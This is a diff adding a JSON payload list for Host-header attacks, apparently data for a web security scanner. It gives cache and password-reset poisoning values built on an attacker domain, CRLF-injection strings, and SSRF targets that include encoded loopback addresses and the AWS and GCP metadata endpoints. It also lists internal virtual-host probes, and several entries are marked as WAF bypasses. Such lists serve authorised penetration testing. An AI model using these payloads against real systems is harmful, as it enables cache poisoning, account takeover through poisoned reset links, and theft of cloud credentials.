@@ -1,0 +1,48 @@
+{
+  "category": "host_header",
+  "contexts": {
+    "poisoning": {
+      "description": "Host header manipulation for web cache poisoning and password reset poisoning",
+      "payloads": [
+        {"payload": "evil.com", "description": "Replace Host with attacker domain", "waf_bypass": false},
+        {"payload": "evil.com:443", "description": "Attacker domain with port", "waf_bypass": false},
+        {"payload": "target.com.evil.com", "description": "Subdomain of attacker domain", "waf_bypass": false},
+        {"payload": "target.com@evil.com", "description": "At-sign URL authority confusion", "waf_bypass": true},
+        {"payload": "target.com%00evil.com", "description": "Null byte host confusion", "waf_bypass": true},
+        {"payload": "target.com%0d%0aX-Injected:true", "description": "CRLF injection in Host header", "waf_bypass": false},
+        {"payload": "evil.com\r\nX-Forwarded-Host: target.com", "description": "Host with CRLF injecting X-Forwarded-Host", "waf_bypass": false},
+        {"payload": "target.com:@evil.com", "description": "Colon-at authority parsing confusion", "waf_bypass": true},
+        {"payload": "Target.Com", "description": "Case variation for cache key mismatch", "waf_bypass": false},
+        {"payload": "target.com:80", "description": "Explicit default port for cache key mismatch", "waf_bypass": false}
+      ]
+    },
+    "ssrf": {
+      "description": "Host header injection for SSRF to internal services",
+      "payloads": [
+        {"payload": "localhost", "description": "Redirect to loopback", "waf_bypass": false},
+        {"payload": "127.0.0.1", "description": "IPv4 loopback", "waf_bypass": false},
+        {"payload": "127.1", "description": "Short-form IPv4 loopback", "waf_bypass": true},
+        {"payload": "[::1]", "description": "IPv6 loopback", "waf_bypass": true},
+        {"payload": "0x7f000001", "description": "Hex-encoded loopback", "waf_bypass": true},
+        {"payload": "169.254.169.254", "description": "AWS metadata endpoint", "waf_bypass": false},
+        {"payload": "metadata.google.internal", "description": "GCP metadata endpoint", "waf_bypass": false},
+        {"payload": "0177.0.0.1", "description": "Octal-encoded loopback", "waf_bypass": true},
+        {"payload": "internal-service.local", "description": "Generic internal hostname probe", "waf_bypass": false},
+        {"payload": "COLLABORATOR", "description": "OOB via Collaborator to detect host-header forwarding", "waf_bypass": false}
+      ]
+    },
+    "routing": {
+      "description": "Host header manipulation for routing bypass and virtual host enumeration",
+      "payloads": [
+        {"payload": "admin.target.com", "description": "Admin subdomain virtual host probe", "waf_bypass": false},
+        {"payload": "staging.target.com", "description": "Staging subdomain virtual host probe", "waf_bypass": false},
+        {"payload": "internal.target.com", "description": "Internal subdomain virtual host probe", "waf_bypass": false},
+        {"payload": "api.target.com", "description": "API subdomain virtual host probe", "waf_bypass": false},
+        {"payload": "dev.target.com", "description": "Dev subdomain virtual host probe", "waf_bypass": false},
+        {"payload": "test.target.com", "description": "Test subdomain virtual host probe", "waf_bypass": false},
+        {"payload": "backend.target.com", "description": "Backend subdomain virtual host probe", "waf_bypass": false},
+        {"payload": "management.target.com", "description": "Management subdomain virtual host probe", "waf_bypass": false}
+      ]
+    }
+  }
+}
